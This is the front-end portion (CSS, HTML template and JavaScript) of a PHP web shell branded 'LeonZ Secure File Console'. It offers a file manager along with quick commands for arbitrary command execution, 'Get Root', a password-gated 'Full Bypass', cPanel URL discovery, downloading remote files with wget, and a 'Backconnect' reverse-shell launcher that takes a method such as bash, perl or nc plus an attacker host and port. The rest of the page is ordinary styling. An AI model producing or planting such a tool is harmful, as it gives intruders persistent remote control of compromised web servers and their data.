        a:hover {
            color:#7bff7b;
        }
        table {
            width:100%;
            border-collapse:collapse;
            margin-top:10px;
            font-size:12px;
            background:rgba(0,0,0,0.3);
        }
        th,td {
            padding:8px 12px;
            border-bottom:1px solid rgba(255,255,255,0.08);
        }
        th {
            color:#ffd166;
            text-align:left;
            background:rgba(17,5,11,0.9);
            font-weight:600;
            text-transform:uppercase;
            font-size:11px;
            letter-spacing:0.5px;
        }
        tbody tr {
            transition:background 0.2s ease;
        }
        tbody tr:hover {
            background:rgba(212,175,55,0.1) !important;
        }
        tbody tr.selected {
            background:rgba(128,128,128,0.3) !important;
        }
        tr:nth-child(even) {
            background:rgba(0,0,0,0.15);
        }
        .file-item {
            display:flex;
            align-items:center;
            gap:10px;
        }
        .file-icon {
            width:20px;
            height:20px;
            display:inline-flex;
            align-items:center;
            justify-content:center;
            border-radius:3px;
            font-size:14px;
        }
        .file-icon.folder {
            color:#4a9eff;
        }
        .file-icon.php {
            color:#777bb4;
        }
        .file-icon.txt {
            color:#888;
        }
        .file-icon.default {
            color:#d4af37;
        }
        .file-name {
            flex:1;
        }
        .folder-name {
            font-weight:500;
            color:#4a9eff;
        }
        .folder-name::before {
            content:"| ";
            color:#888;
        }
        .folder-name::after {
            content:" |";
            color:#888;
        }
        textarea {
            width:100%;
            height:280px;
            margin-top:5px;
        }
        .forms {
            display:flex;
            flex-wrap:wrap;
            gap:10px;
            margin-top:8px;
        }
        .forms form { display:inline-flex; gap:5px; align-items:center; }
        .small { font-size:11px; opacity:0.7; }
        .badge {
            font-size:10px;
            text-transform:uppercase;
            padding:2px 6px;
            border-radius:4px;
            border:1px solid;
        }
        .badge-full { border-color:#7bff7b; color:#7bff7b; }
        .badge-ro { border-color:#ffd166; color:#ffd166; }
        .console {
            background:#050308;
            border:1px solid rgba(212,175,55,0.4);
            padding:8px;
            border-radius:8px;
            margin:10px 0;
            box-shadow:0 0 15px rgba(212,175,55,0.15);
        }
        .console-input { display:flex; align-items:center; gap:6px; }
        .console-input span { font-family:Consolas,monospace; }
        .console pre {
            margin:5px 0 0;
            font-size:12px;
            max-height:220px;
            overflow:auto;
            background:rgba(10,5,10,0.8);
            padding:6px;
            border-radius:4px;
        }
        .breadcrumb {
            font-size: 11px;
            opacity: 0.9;
            margin-top: 4px;
        }
        .breadcrumb a {
            color: #ffd166;
            text-decoration: none;
            padding: 1px 3px;
            border-bottom: 1px dashed rgba(212,175,55,0.4);
            transition: color 0.2s ease, border-color 0.2s ease, text-shadow 0.2s ease;
        }
        .breadcrumb a:hover {
            color: #7bff7b;
            border-color: #7bff7b;
            text-shadow: 0 0 8px rgba(123,255,123,0.8);
        }
        .crumb-root {
            color: #d4af37;
            font-weight: bold;
        }
        .crumb-sep {
            color: #888;
            padding: 0 3px;
        }
        .crumb-part-disabled {
            color: #888;
            opacity: 0.7;
            cursor: pointer;
            text-decoration: none;
            padding: 1px 3px;
            border-bottom: 1px dashed rgba(136,136,136,0.4);
        }
        .crumb-part-disabled:hover {
            color: #aaa;
            opacity: 1;
            border-bottom-color: #aaa;
        }
        hr.footer-line {
            border: none;
            border-top: 1px solid rgba(212,175,55,0.3);
            margin-top: 30px;
        }
        .command-menu {
            background: rgba(17,5,11,0.6);
            border: 1px solid rgba(212,175,55,0.3);
            border-radius: 8px;
            padding: 12px;
            margin: 10px 0;
            overflow-x: auto;
            overflow-y: hidden;
        }
        .command-menu h3 {
            margin: 0 0 10px 0;
            font-size: 12px;
            color: #d4af37;
            text-transform: uppercase;
            letter-spacing: 1px;
            border-bottom: 1px solid rgba(212,175,55,0.2);
            padding-bottom: 6px;
            position: sticky;
            left: 0;
        }
        .command-menu-buttons {
            display: flex;
            flex-wrap: nowrap;
            gap: 6px;
            align-items: center;
            min-width: max-content;
        }
        .cmd-form-inline {
            display: inline-flex;
            flex-shrink: 0;
            margin: 0;
        }
        .cmd-btn {
            background: rgba(17,5,11,0.8);
            color: #f8f4f0;
            border: 1px solid #d4af37;
            padding: 6px 12px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 11px;
            text-align: center;
            transition: all 0.2s ease;
            text-transform: lowercase;
            white-space: nowrap;
            min-width: auto;
        }
        .cmd-btn:hover {
            background: #d4af37;
            color: #050308;
            transform: translateY(-1px);
            box-shadow: 0 2px 8px rgba(212,175,55,0.4);
        }
        .cmd-btn.primary {
            border-color: #7bff7b;
            color: #7bff7b;
        }
        .cmd-btn.primary:hover {
            background: #7bff7b;
            color: #050308;
        }
        .cmd-btn.danger {
            border-color: #ff5555;
            color: #ff5555;
        }
        .cmd-btn.danger:hover {
            background: #ff5555;
            color: #050308;
        }
    </style>
</head>
<body>
    <div class="header">
        <div class="brand">
            <div class="logo-text">
                <div class="logo-leonz">LeonZ</div>
                <div class="logo-subtitle">Secure File Console</div>
            </div>
            <div>
                <div class="subtitle" style="margin-top: 8px;">DIGITAL SERVICE · Secure File Console</div>
                <div class="small">
                    IP: <?php echo htmlspecialchars($client_ip); ?> ·
                    Mode:
                    <?php if ($access_mode === 'full'): ?>
                        <span class="badge badge-full">full access</span>
                    <?php else: ?>
                        <span class="badge badge-ro">read-only</span>
                    <?php endif; ?>
                    <?php if (isset($_SESSION['root_bypass']) && $_SESSION['root_bypass']): ?>
                        · <span class="badge" style="border-color:#ff5555;color:#ff5555;">BYPASS</span>
                    <?php endif; ?>
                    <?php if (isset($_SESSION['custom_root'])): ?>
                        · <span class="badge" style="border-color:#7bff7b;color:#7bff7b;">ROOT ACTIVE</span>
                    <?php endif; ?>
                    <br>
                    <span style="opacity:0.6;font-size:10px;">
                        Root: <?php echo htmlspecialchars($root_dir); ?>
                    </span>
                </div>
            </div>
        </div>
        <form method="post">
            <button type="submit" name="logout">Logout</button>
        </form>
    </div>

    <p class="small">
        📂 Current Directory:
        <span class="breadcrumb">
            <?php echo renderBreadcrumb($current_dir, $root_dir); ?>
        </span>
        <?php if ($parent_link): ?>
            &nbsp; | &nbsp;
            <a href="?dir=<?php echo urlencode($parent_link); ?>">⬆ Up</a>
        <?php endif; ?>
        <?php 
        $script_dir_real = $script_dir ? (realpath($script_dir) ?: $script_dir) : null;
        $current_dir_real = $current_dir ? (realpath($current_dir) ?: $current_dir) : null;
        if ($script_dir_real && $current_dir_real && $script_dir_real !== $current_dir_real): ?>
            &nbsp; | &nbsp;
            <a href="?dir=<?php echo urlencode($script_dir); ?>" style="color:#4a9eff;font-weight:500;">🏠HOME</a>
        <?php endif; ?>
        <br>
        <span style="opacity:0.6;font-size:10px;font-family:monospace;">
            Full Path: <?php echo htmlspecialchars($current_dir); ?>
        </span>
    </p>

    <div class="command-menu">
        <h3>⚡ Quick Commands</h3>
        <div class="command-menu-buttons">
        <form method="post" class="cmd-form-inline">
            <input type="hidden" name="quick_cmd" value="help">
            <button type="submit" class="cmd-btn">Help</button>
        </form>
        <form method="post" class="cmd-form-inline">
            <input type="hidden" name="quick_cmd" value="pwd">
            <button type="submit" class="cmd-btn">PWD</button>
        </form>
        <form method="post" class="cmd-form-inline">
            <input type="hidden" name="quick_cmd" value="ls">
            <button type="submit" class="cmd-btn">LS</button>
        </form>
        <form method="post" class="cmd-form-inline">
            <input type="hidden" name="quick_cmd" value="getroot">
            <button type="submit" class="cmd-btn">Get Root</button>
        </form>
        <form method="post" class="cmd-form-inline">
            <input type="hidden" name="quick_cmd" value="perms">
            <button type="submit" class="cmd-btn">Perms</button>
        </form>
        <form method="post" class="cmd-form-inline" onsubmit="return promptChmod(this);">
            <input type="hidden" name="quick_cmd" value="chmod">
            <input type="text" name="cmd_args" placeholder="mode path" style="display:none;">
            <button type="button" class="cmd-btn" onclick="promptChmodForm(this)">Chmod</button>
        </form>
        <form method="post" class="cmd-form-inline" onsubmit="return promptSetroot(this);">
            <input type="hidden" name="quick_cmd" value="setroot">
            <input type="text" name="cmd_args" placeholder="path" style="display:none;">
            <button type="button" class="cmd-btn primary" onclick="promptSetrootForm(this)">Set Root</button>
        </form>
        <?php if (isset($_SESSION['loggedin'])): ?>
            <form method="post" class="cmd-form-inline" onsubmit="return promptBypass(this);">
                <input type="hidden" name="quick_cmd" value="bypass">
                <input type="text" name="cmd_args" placeholder="password" style="display:none;">
                <button type="button" class="cmd-btn danger" onclick="promptBypassForm(this)">Full Bypass</button>
            </form>
            <form method="post" class="cmd-form-inline" onsubmit="return promptUnbypass(this);">
                <input type="hidden" name="quick_cmd" value="unbypass">
                <input type="text" name="cmd_args" placeholder="password" style="display:none;">
                <button type="button" class="cmd-btn" onclick="promptUnbypassForm(this)">Unbypass</button>
            </form>
        <?php endif; ?>
        <form method="post" class="cmd-form-inline">
            <input type="hidden" name="quick_cmd" value="baseline">
            <button type="submit" class="cmd-btn primary">Baseline</button>
        </form>
        
        <form method="post" class="cmd-form-inline">
            <input type="hidden" name="quick_cmd" value="audit">
            <button type="submit" class="cmd-btn primary">Audit</button>
        </form>
        
        <form method="post" class="cmd-form-inline">
            <input type="hidden" name="quick_cmd" value="shellcheck">
            <button type="submit" class="cmd-btn primary">Shell Check</button>
        </form>
        
        <form method="post" class="cmd-form-inline">
            <input type="hidden" name="quick_cmd" value="cpanel">
            <button type="submit" class="cmd-btn">cPanel URL</button>
        </form>
        
        <form method="post" class="cmd-form-inline" onsubmit="return promptWget(this);">
            <input type="hidden" name="quick_cmd" value="wget">
            <input type="text" name="cmd_args" placeholder="url" style="display:none;">
            <button type="button" class="cmd-btn" onclick="promptWgetForm(this)">wget</button>
        </form>
        
        <form method="post" class="cmd-form-inline">
            <input type="hidden" name="quick_cmd" value="process">
            <button type="submit" class="cmd-btn">Process</button>
        </form>
        
        <form method="post" class="cmd-form-inline">
            <input type="hidden" name="quick_cmd" value="network">
            <button type="submit" class="cmd-btn">Network</button>
        </form>
        
        <form method="post" class="cmd-form-inline">
            <input type="hidden" name="quick_cmd" value="disk">
            <button type="submit" class="cmd-btn">Disk</button>
        </form>
        
        <form method="post" class="cmd-form-inline">
            <input type="hidden" name="quick_cmd" value="phpinfo">
            <button type="submit" class="cmd-btn">PHP Info</button>
        </form>
        
        <form method="post" class="cmd-form-inline">
            <input type="hidden" name="quick_cmd" value="disabled">
            <button type="submit" class="cmd-btn">Disabled Funcs</button>
        </form>
        
        <form method="post" class="cmd-form-inline" onsubmit="return promptSearch(this);">
            <input type="hidden" name="quick_cmd" value="search">
            <input type="text" name="cmd_args" placeholder="keyword path" style="display:none;">
            <button type="button" class="cmd-btn" onclick="promptSearchForm(this)">Search</button>
        </form>

        <form method="post" class="cmd-form-inline" onsubmit="return promptReplace(this);">
            <input type="hidden" name="quick_cmd" value="replace">
            <input type="text" name="cmd_args" placeholder="find|replace|path" style="display:none;">
            <button type="button" class="cmd-btn" onclick="promptReplaceForm(this)">Replace</button>
        </form>

        <form method="post" class="cmd-form-inline" onsubmit="return promptExtract(this);">
            <input type="hidden" name="quick_cmd" value="extract">
            <input type="text" name="cmd_args" placeholder="zip|dest" style="display:none;">
            <button type="button" class="cmd-btn" onclick="promptExtractForm(this)">Extract</button>
        </form>

        <form method="post" class="cmd-form-inline" onsubmit="return promptZip(this);">
            <input type="hidden" name="quick_cmd" value="zip">
            <input type="text" name="cmd_args" placeholder="path" style="display:none;">
            <button type="button" class="cmd-btn" onclick="promptZipForm(this)">Compress</button>
        </form>
        
        <?php if (isset($_SESSION['loggedin'])): ?>
            <form method="post" class="cmd-form-inline" onsubmit="return promptBackconnect(this);">
                <input type="hidden" name="quick_cmd" value="backconnect">
                <input type="text" name="cmd_args" placeholder="method host port" style="display:none;">
                <button type="button" class="cmd-btn danger" onclick="promptBackconnectForm(this)">Backconnect</button>
            </form>
            <form method="post" class="cmd-form-inline" onsubmit="return promptExec(this);">
                <input type="hidden" name="quick_cmd" value="exec">
                <input type="text" name="cmd_args" placeholder="command" style="display:none;">
                <button type="button" class="cmd-btn danger" onclick="promptExecForm(this)">Exec</button>
            </form>
        <?php endif; ?>
        </div>
    </div>

    <div class="console">
        <form method="post" class="console-input">
            <span style="color:#7bff7b; font-weight:bold;">
                <?php echo htmlspecialchars($server_user); ?>
            </span>
            <span style="color:#ffd166;">@</span>
            <span style="color:#d4af37; font-weight:bold;">
                <?php echo htmlspecialchars($server_host); ?>
            </span>
            <span style="color:#7bff7b;">:~$</span>
            <input type="text" name="command_line"
                   placeholder="Type 'help', 'perms', 'chmod', 'baseline', 'audit', 'cpanel', 'wget'..."
                   style="flex:1;background:#0a060a;color:#f8f4f0;
                          border:1px solid #d4af37;padding:4px 6px;border-radius:4px;">
            <button type="submit" name="run_cmd"
                    style="background:#d4af37;color:#050308;border:none;
                           padding:5px 10px;font-weight:bold;cursor:pointer;
                           border-radius:6px;">Run</button>
        </form>

        <?php if (!empty($shell_output)): ?>
            <pre><?php echo htmlspecialchars($shell_output); ?></pre>
        <?php endif; ?>
    </div>

    <?php if ($access_mode === 'full'): ?>
        <div class="forms">
            <?php if (isset($_GET['upload_error'])): ?>
                <div class="error" style="color:#ff5555;margin-bottom:8px;padding:8px;background:rgba(255,85,85,0.1);border:1px solid #ff5555;border-radius:4px;">
                    <?php echo htmlspecialchars($_GET['upload_error']); ?>
                </div>
            <?php endif; ?>
            <?php if (isset($_GET['upload_success'])): ?>
                <div style="color:#7bff7b;margin-bottom:8px;padding:8px;background:rgba(123,255,123,0.1);border:1px solid #7bff7b;border-radius:4px;">
                    ✓ <?php echo count(explode(', ', $_GET['upload_success'])) > 1 ? 'Files' : 'File'; ?> "<?php echo htmlspecialchars($_GET['upload_success']); ?>" uploaded successfully!
                </div>
            <?php endif; ?>
            <?php if (isset($_GET['extract_success'])): ?>
                <div style="color:#7bff7b;margin-bottom:8px;padding:8px;background:rgba(123,255,123,0.1);border:1px solid #7bff7b;border-radius:4px;">
                    ✓ <?php echo htmlspecialchars($_GET['extract_success']); ?>
                </div>
            <?php endif; ?>
            <?php if (isset($_GET['extract_error'])): ?>
                <div class="error" style="color:#ff5555;margin-bottom:8px;padding:8px;background:rgba(255,85,85,0.1);border:1px solid #ff5555;border-radius:4px;">
                    <?php echo htmlspecialchars($_GET['extract_error']); ?>
                </div>
            <?php endif; ?>
            <?php if (isset($_GET['zip_error'])): ?>
                <div class="error" style="color:#ff5555;margin-bottom:8px;padding:8px;background:rgba(255,85,85,0.1);border:1px solid #ff5555;border-radius:4px;">
                    <?php echo htmlspecialchars($_GET['zip_error']); ?>
                </div>
            <?php endif; ?>
            <form method="post" enctype="multipart/form-data">
                <input type="file" name="files[]" multiple required>
                <button type="submit" name="upload">Upload</button>
            </form>

            <form method="post">
                <input type="text" name="new_file_name" placeholder="New File Name" required>
                <button type="submit" name="create_file">Create File</button>
            </form>

            <form method="post">
                <input type="text" name="new_folder_name" placeholder="New Folder Name" required>
                <button type="submit" name="create_folder">Create Folder</button>
            </form>
        </div>
    <?php else: ?>
        <p class="small">Read-only mode: upload, edit, delete, dan create dimatikan untuk IP ini.</p>
    <?php endif; ?>

    <?php if ($rename_item !== null): ?>
        <h3>Rename: <?php echo $rename_item; ?></h3>
        <form method="post">
            <input type="hidden" name="old_name" value="<?php echo $rename_item; ?>">
            <input type="text" name="new_name" placeholder="New name" required>
            <button type="submit" name="rename_file">Rename</button>
        </form>
    <?php endif; ?>

    <?php if ($chmod_item !== null): ?>
        <?php
        global $realpath_cache;
        $test_path = $current_dir . '/' . $chmod_item;
        if (!isset($realpath_cache[$test_path])) {
            $realpath_cache[$test_path] = realpath($test_path);
        }
        $chmod_target = $realpath_cache[$test_path];
        $current_perms = '';
        if ($chmod_target && file_exists($chmod_target)) {
            $current_perms = substr(sprintf('%o', @fileperms($chmod_target)), -4);
        }
        $error_msg = isset($_GET['error']) && $_GET['error'] === 'invalid_mode' ? 'Invalid mode format. Use octal (e.g., 755, 0644)' : '';
        ?>
        <h3>Change Permissions: <?php echo htmlspecialchars($chmod_item); ?></h3>
        <?php if ($error_msg): ?>
            <p style="color:#ff5555;font-size:12px;"><?php echo htmlspecialchars($error_msg); ?></p>
        <?php endif; ?>
        <form method="post">
            <input type="hidden" name="target_name" value="<?php echo htmlspecialchars($chmod_item); ?>">
            <p class="small">Current permissions: <strong><?php echo htmlspecialchars($current_perms); ?></strong></p>
            <input type="text" name="chmod_mode" placeholder="Mode (e.g., 755, 0644, 777)" 
                   pattern="[0-7]{3,4}" maxlength="4" required
                   style="width:200px;margin-right:8px;">
            <button type="submit" name="apply_chmod">Apply Chmod</button>
        </form>
        <p class="small" style="margin-top:5px;opacity:0.7;">
            Examples: 755 (rwxr-xr-x), 644 (rw-r--r--), 777 (rwxrwxrwx)
        </p>
    <?php endif; ?>

    <?php if ($edit_file !== null && $file_content !== null): ?>
        <h3>Editing: <?php echo htmlspecialchars($edit_file); ?></h3>
        <?php if ($access_mode === 'full'): ?>
            <form method="post">
                <textarea name="file_content"><?php echo $file_content; ?></textarea>
                <input type="hidden" name="file_name" value="<?php echo htmlspecialchars($edit_file); ?>">
                <button type="submit" name="save_edit">Save</button>
            </form>
        <?php else: ?>
            <textarea readonly><?php echo $file_content; ?></textarea>
            <p class="small">Read-only mode: tidak bisa menyimpan perubahan.</p>
        <?php endif; ?>
    <?php endif; ?>

    <table>
        <thead>
            <tr>
                <th>File/Folder</th>
                <th>Size</th>
                <th>Last Modified</th>
                <th>Permissions</th>
                <th>Actions</th>
            </tr>
        </thead>
        <tbody>
            <?php listDirectory($current_dir, $access_mode, $root_dir); ?>
        </tbody>
    </table>

    <hr class="footer-line">
    <p class="small" style="text-align:center;opacity:0.5;">
        Powered by <b style="color:#d4af37;">LeonZ</b> · Secure File Console
    </p>

    <script>
        function promptChmodForm(btn) {
            var form = btn.closest('form');
            var args = prompt('Enter chmod arguments:\nFormat: [mode] [path]\nExample: 755 file.txt');
            if (args !== null && args.trim() !== '') {
                form.querySelector('input[name="cmd_args"]').value = args.trim();
                form.submit();
            }
        }
        
        function promptSetrootForm(btn) {
            var form = btn.closest('form');
            var path = prompt('Enter root directory path:\nExample: /home/user or C:\\Users\\user\n\nNote: This directory will be protected. Only full bypass can access/modify it.');
            if (path !== null && path.trim() !== '') {
                form.querySelector('input[name="cmd_args"]').value = path.trim();
                form.submit();
            }
        }
        
        function promptBypassForm(btn) {
            var form = btn.closest('form');
            var pass = prompt('Input password:');
            if (pass !== null && pass.trim() !== '') {
                form.querySelector('input[name="cmd_args"]').value = pass.trim();
                form.submit();
            }
        }
        
        function promptUnbypassForm(btn) {
            var form = btn.closest('form');
            var pass = prompt('Input password to disable bypass:');
            if (pass !== null && pass.trim() !== '') {
                form.querySelector('input[name="cmd_args"]').value = pass.trim();
                form.submit();
            }
        }
        
        function promptSeclogForm(btn) {
            var form = btn.closest('form');
            var n = prompt('Enter number of log lines (default: 20):', '20');
            if (n !== null) {
                form.querySelector('input[name="cmd_args"]').value = n.trim() || '20';
                form.submit();
            }
        }

        function promptWgetForm(btn) {
            var form = btn.closest('form');
            var url = prompt('Enter URL to download:\nExample: https://example.com/file.zip');
            if (url !== null && url.trim() !== '') {
                form.querySelector('input[name="cmd_args"]').value = url.trim();
                form.submit();
            }
        }
        
        function promptChmod(form) {
            var args = form.querySelector('input[name="cmd_args"]').value;
            if (!args || args.trim() === '') {
                promptChmodForm(form.querySelector('button'));
                return false;
            }
            return true;
        }
        
        function promptSetroot(form) {
            var args = form.querySelector('input[name="cmd_args"]').value;
            if (!args || args.trim() === '') {
                promptSetrootForm(form.querySelector('button'));
                return false;
            }
            return true;
        }
        
        function promptBypass(form) {
            var args = form.querySelector('input[name="cmd_args"]').value;
            if (!args || args.trim() === '') {
                promptBypassForm(form.querySelector('button'));
                return false;
            }
            return true;
        }
        
        function promptUnbypass(form) {
            var args = form.querySelector('input[name="cmd_args"]').value;
            if (!args || args.trim() === '') {
                promptUnbypassForm(form.querySelector('button'));
                return false;
            }
            return true;
        }
        
        function promptSeclog(form) {
            var args = form.querySelector('input[name="cmd_args"]').value;
            if (!args || args.trim() === '') {
                promptSeclogForm(form.querySelector('button'));
                return false;
            }
            return true;
        }

        function promptWget(form) {
            var args = form.querySelector('input[name="cmd_args"]').value;
            if (!args || args.trim() === '') {
                promptWgetForm(form.querySelector('button'));
                return false;
            }
            return true;
        }
        
        function promptExecForm(btn) {
            var form = btn.closest('form');
            var cmd = prompt('Enter command to execute:\nExample: id; whoami; ls -la');
            if (cmd !== null && cmd.trim() !== '') {
                form.querySelector('input[name="cmd_args"]').value = cmd.trim();
                form.submit();
            }
        }
        
        function promptExec(form) {
            var args = form.querySelector('input[name="cmd_args"]').value;
            if (!args || args.trim() === '') {
                promptExecForm(form.querySelector('button'));
                return false;
            }
            return true;
        }
        
        function promptSearchForm(btn) {
            var form = btn.closest('form');
            var keyword = prompt('Enter keyword to search:\nExample: password');
            if (keyword !== null && keyword.trim() !== '') {
                var path = prompt('Enter path to search (leave empty for current dir):', '');
                var args = keyword.trim();
                if (path && path.trim() !== '') {
                    args += ' ' + path.trim();
                }
                form.querySelector('input[name="cmd_args"]').value = args;
                form.submit();
            }
        }
        
        function promptSearch(form) {
            var args = form.querySelector('input[name="cmd_args"]').value;
            if (!args || args.trim() === '') {
                promptSearchForm(form.querySelector('button'));
                return false;
            }
            return true;
        }

        function promptReplaceForm(btn) {
            var form = btn.closest('form');
            var findText = prompt('Enter text to find:\nExample: old_password');
            if (findText === null || findText.trim() === '') return;
            var replaceText = prompt('Enter replacement text:\nLeave empty to delete matched text');
            if (replaceText === null) return;
            var path = prompt('Enter path to scan (leave empty for current dir):', '');
            if (path === null) return;
            var args = findText + '|' + replaceText;
            if (path.trim() !== '') {
                args += '|' + path.trim();
            }
            form.querySelector('input[name="cmd_args"]').value = args;
            form.submit();
        }

        function promptReplace(form) {
            var args = form.querySelector('input[name="cmd_args"]').value;
            if (!args || args.trim() === '') {
                promptReplaceForm(form.querySelector('button'));
                return false;
            }
            return true;
        }

        function promptExtractForm(btn) {
            var form = btn.closest('form');
            var zipFile = prompt('Enter zip file name or path:\nExample: backup.zip');
            if (zipFile === null || zipFile.trim() === '') return;
            var dest = prompt('Enter destination directory (leave empty for current dir):', '');
            if (dest === null) return;
            var args = zipFile.trim();
            if (dest.trim() !== '') {
                args += '|' + dest.trim();
            }
            form.querySelector('input[name="cmd_args"]').value = args;
            form.submit();
        }

        function promptExtract(form) {
            var args = form.querySelector('input[name="cmd_args"]').value;
            if (!args || args.trim() === '') {
                promptExtractForm(form.querySelector('button'));
                return false;
            }
            return true;
        }

        function promptZipForm(btn) {
            var form = btn.closest('form');
            var path = prompt('Enter file or folder to compress:\nExample: public_html\nTip: use Compress action in file list to download directly');
            if (path !== null && path.trim() !== '') {
                form.querySelector('input[name="cmd_args"]').value = path.trim();
                form.submit();
            }
        }

        function promptZip(form) {
            var args = form.querySelector('input[name="cmd_args"]').value;
            if (!args || args.trim() === '') {
                promptZipForm(form.querySelector('button'));
                return false;
            }
            return true;
        }
        
        function promptBackconnectForm(btn) {
            var form = btn.closest('form');
            var method = prompt('Enter method (perl/python/ruby/bash/php/nc/sh/xterm/golang):', 'bash');
            if (method !== null && method.trim() !== '') {
                var host = prompt('Enter host IP/domain:', '');
                if (host !== null && host.trim() !== '') {
                    var port = prompt('Enter port:', '4444');
                    if (port !== null && port.trim() !== '') {
                        form.querySelector('input[name="cmd_args"]').value = method.trim() + ' ' + host.trim() + ' ' + port.trim();
                        form.submit();
                    }
                }
            }
        }
        
        function promptBackconnect(form) {
            var args = form.querySelector('input[name="cmd_args"]').value;
            if (!args || args.trim() === '') {
                promptBackconnectForm(form.querySelector('button'));
                return false;
            }
            return true;
        }
    </script>
</body>
</html>
